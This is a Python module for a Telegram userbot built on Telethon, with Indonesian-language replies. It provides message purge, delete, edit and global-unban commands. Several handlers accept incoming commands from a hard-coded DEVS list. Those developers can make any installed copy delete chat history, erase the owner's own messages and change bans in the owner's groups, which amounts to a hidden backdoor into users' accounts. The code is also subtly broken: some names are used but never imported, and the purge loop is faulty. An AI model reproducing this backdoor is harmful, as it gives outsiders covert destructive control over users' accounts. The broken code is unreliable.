import asyncio
import random
from asyncio import sleep
from datetime import datetime

from telethon.errors import rpcbaseerrors

import userbot.modules.sql_helper.gban_sql as gban_sql
from userbot import BOTLOG_CHATID
from userbot import DEVS
from userbot.events import register
from userbot.utils import edit_or_reply


from .admin import BANNED_RIGHTS, UNBAN_RIGHTS


@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
async def ownfastpurger(purg):
    chat = await purg.get_input_chat()
    msgs = []
    itermsg = purg.client.iter_messages(chat, min_id=purg.reply_to_msg_id)
    count = 0

    if purg.reply_to_msg_id is not None:
        async for msg in itermsg:
            msgs.append(msg)
            count += 1
            msgs.append(purg.reply_to_msg_id)
            if len(msgs) == 100:
                await purg.client.delete_messages(chat, msgs)
                msgs = []
    else:
        return await purg.edit("`Mohon Balas Ke Pesan`")

    if msgs:
        await purg.client.delete_messages(chat, msgs)
    done = await purg.client.send_message(
        purg.chat_id, f"**Berhasil Menghapus Pesan**\
        \n**Jumlah Pesan Yang Dihapus** [`{str(count)}`] **Pesan**"
    )
    await sleep(2)
    await done.delete()


@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme$")
async def ownpurgeme(delme):
    message = delme.text
    count = int(message[9:])
    i = 1

    async for message in delme.client.iter_messages(delme.chat_id, from_user="me"):
        if i > count + 1:
            break
        i += 1
        await message.delete()

    smsg = await delme.client.send_message(
        delme.chat_id,
        "**Berhasil Menghapus Pesan,** " + str(count) + " **Pesan Telah Dihapus**",
    )
    await sleep(2)
    i = 1
    await smsg.delete()


@register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
async def owndelete_it(delme):
    msg_src = await delme.get_reply_message()
    if delme.reply_to_msg_id:
        try:
            await msg_src.delete()
            await delme.delete()
        except rpcbaseerrors.BadRequestError:
            await delme.edit("`Tidak Dapat Menghapus Pesan`")


@register(outgoing=True, pattern=r"^\.edit")
async def ownediter(edit):
    message = edit.text
    chat = await edit.get_input_chat()
    self_id = await edit.client.get_peer_id("me")
    string = str(message[6:])
    i = 1
    async for message in edit.client.iter_messages(chat, self_id):
        if i == 2:
            await message.edit(string)
            await edit.delete()
            break
        i += 1


@register(incoming=True, from_users=DEVS, pattern=r"^\.cungbann(?: |$)(.*)")
async def ownungban(event):
    if event.fwd_from:
        return
    ungbun = await edit_or_reply(event, "`UnGbanning...`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, ungbun)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.freakungban(user.id)
    else:
        await ungbun.edit(
            f"**Si** [Caper](tg://user?id={user.id}) **ini kaga ada di dalam daftar gban lo**"
        )
        return
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await ungbun.edit("**Lo Kaga Punya GC yang Jadi Admin Tot**")
        return
    await ungbun.edit(
        f"**initiating ungban of the** [Caper](tg://user?id={user.id}) **in** `{len(san)}` **groups**"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"**Lo Kaga Punya Izin Banned di :**\n**Group Chat :** `{event.chat_id}`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await ungbun.edit(
            f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}`) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Reason :** `{reason}`"
        )
    else:
        await ungbun.edit(
            f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Removed from gbanlist**")

